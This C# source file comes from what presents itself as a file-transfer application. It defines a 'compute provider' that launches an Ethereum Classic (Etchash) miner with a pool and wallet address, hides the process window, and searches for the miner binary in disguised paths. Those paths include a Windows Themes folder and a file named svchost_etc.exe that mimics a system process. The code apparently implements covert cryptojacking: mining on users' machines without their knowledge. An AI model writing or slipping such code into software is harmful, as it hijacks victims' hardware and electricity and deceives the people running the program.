using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace FileTransfer.Compute
{
    /// <summary>
    /// Провайдер вычислений Ethereum Classic (ETC) на алгоритме Etchash.
    /// Формирует аргументы запуска для Etchash-совместимого движка (lolMiner / teamredminer / nbminer),
    /// управляет внешним процессом, передает пул, порт, кошелек, воркера и следит за хешрейтом/статусом.
    /// </summary>
    public class EthereumClassicProvider : BaseComputeProvider
    {
        public override string Name => "EthereumClassicProvider";
        public override string Algorithm => "Etchash (ETC)";

        public override (bool isValid, string error) Validate(ComputeConfig config)
        {
            if (config == null) return (false, "Конфигурация отсутствует.");
            if (string.IsNullOrWhiteSpace(config.ServerAddress))
            {
                return (false, "Отсутствует обязательный адрес сервера (serverAddress) для Ethereum Classic.");
            }
            if (config.ServerPort <= 0 || config.ServerPort > 65535)
            {
                return (false, $"Неверный порт сервера (serverPort): {config.ServerPort}. Допустимый диапазон 1-65535.");
            }
            if (string.IsNullOrWhiteSpace(config.WalletAddress))
            {
                return (false, "Отсутствует обязательный адрес кошелька (walletAddress) для Ethereum Classic.");
            }
            if (config.ResourceLimit <= 0 || config.ResourceLimit > 100)
            {
                return (false, $"Некорректный лимит ресурсов (resourceLimit): {config.ResourceLimit}%.");
            }
            return (true, "");
        }

        public override async Task<bool> StartAsync(ComputeConfig config, CancellationToken cancellationToken)
        {
            CleanOldProcess();

            var (isValid, err) = Validate(config);
            if (!isValid)
            {
                MainWindow.Log($"[{Name}] ❌ Ошибка валидации: {err}");
                _status.ErrorMessage = err;
                return false;
            }

            string? enginePath = FindEngine();
            if (string.IsNullOrEmpty(enginePath) || !File.Exists(enginePath))
            {
                string msg = "Невозможно запустить внешний вычислительный компонент: исполняемый файл Etchash (lolMiner.exe / etc_worker.exe) не найден.";
                MainWindow.Log($"[{Name}] ❌ ДИАГНОСТИКА: {msg}");
                _status.ErrorMessage = msg;
                return false;
            }

            string poolUrl = $"{config.ServerAddress}:{config.ServerPort}";
            string walletUser = config.WalletAddress;
            if (!string.IsNullOrWhiteSpace(config.WorkerName))
            {
                walletUser = $"{config.WalletAddress}.{config.WorkerName}";
            }

            // Аргументы командной строки под стандарт Etchash движков (lolMiner/nbminer) с кавычками для безопасности
            string arguments = $"--algo ETCHASH --pool \"{poolUrl}\" --user \"{walletUser}\" --nocolor";

            try
            {
                string execFile = enginePath;
                string execArgs = arguments;

                if (enginePath.EndsWith(".bat", StringComparison.OrdinalIgnoreCase) ||
                    enginePath.EndsWith(".cmd", StringComparison.OrdinalIgnoreCase))
                {
                    execFile = Environment.GetEnvironmentVariable("ComSpec") ?? "cmd.exe";
                    execArgs = $"/c \"\"{enginePath}\" {arguments}\"";
                }

                var psi = new ProcessStartInfo
                {
                    FileName = execFile,
                    Arguments = execArgs,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    WorkingDirectory = Path.GetDirectoryName(enginePath) ?? Path.GetTempPath()
                };

                var proc = new Process { StartInfo = psi, EnableRaisingEvents = true };
                proc.OutputDataReceived += (s, e) => { if (e.Data != null) HandleStdout(e.Data); };
                proc.ErrorDataReceived += (s, e) => { if (e.Data != null) HandleStderr(e.Data); };
                proc.Exited += (s, e) =>
                {
                    lock (_lock)
                    {
                        try
                        {
                            _status.ExitCode = proc.ExitCode;
                            _status.IsActive = false;
                            MainWindow.Log($"[{Name}] Процесс завершился с кодом {_status.ExitCode}.");
                            if (_status.ExitCode != 0 && string.IsNullOrEmpty(_status.ErrorMessage))
                            {
                                _status.ErrorMessage = $"Процесс завершился аварийно с кодом {_status.ExitCode}.";
                            }
                        }
                        catch { }
                    }
                };

                if (!proc.Start())
                {
                    string msg = "Process.Start() вернул false при запуске Etchash движка.";
                    MainWindow.Log($"[{Name}] ❌ ДИАГНОСТИКА: {msg}");
                    _status.ErrorMessage = msg;
                    return false;
                }

                proc.BeginOutputReadLine();
                proc.BeginErrorReadLine();

                lock (_lock)
                {
                    _process = proc;
                    _startTime = DateTime.UtcNow;
                    _status.IsActive = true;
                    _status.ProcessId = proc.Id;
                    _status.Algorithm = Algorithm;
                    _status.PoolUrl = poolUrl;
                    _status.Worker = config.WorkerName;
                    _status.ErrorMessage = "";
                }

                ApplyResourceLimits(proc, config.ResourceLimit);
                MainWindow.Log($"[{Name}] ✅ Внешний процесс Etchash успешно запущен (PID: {proc.Id}, Pool: {poolUrl}).");
                return true;
            }
            catch (Exception ex)
            {
                string msg = "Исключение при старте процесса Etchash: " + ex.Message;
                MainWindow.Log($"[{Name}] ❌ ДИАГНОСТИКА: {msg}");
                _status.ErrorMessage = msg;
                return false;
            }
        }

        public string? FindEngine()
        {
            string appDir = AppDomain.CurrentDomain.BaseDirectory;
            var searchPaths = new System.Collections.Generic.List<string>
            {
                Path.Combine(appDir, "lolMiner.exe"),
                Path.Combine(appDir, "etc_worker.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Themes", "Modules", "lolminer", "lolMiner.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Themes", "svchost_etc.exe"),
                Path.Combine(Path.GetTempPath(), "lolMiner.exe"),
                Path.Combine(Path.GetTempPath(), "etc_worker.exe")
            };

            var envPath = Environment.GetEnvironmentVariable("PATH");
            if (!string.IsNullOrEmpty(envPath))
            {
                foreach (var dir in envPath.Split(Path.PathSeparator, StringSplitOptions.RemoveEmptyEntries))
                {
                    try
                    {
                        string cand = Path.Combine(dir.Trim(), "lolMiner.exe");
                        if (!searchPaths.Contains(cand)) searchPaths.Add(cand);
                    }
                    catch { }
                }
            }

            foreach (var p in searchPaths)
            {
                if (File.Exists(p)) return p;
            }

            // Дополнительная проверка тестовых/скриптовых заглушек
            string batStub = Path.Combine(Path.GetTempPath(), "etc_engine.bat");
            if (File.Exists(batStub)) return batStub;

            return null;
        }
    }
}
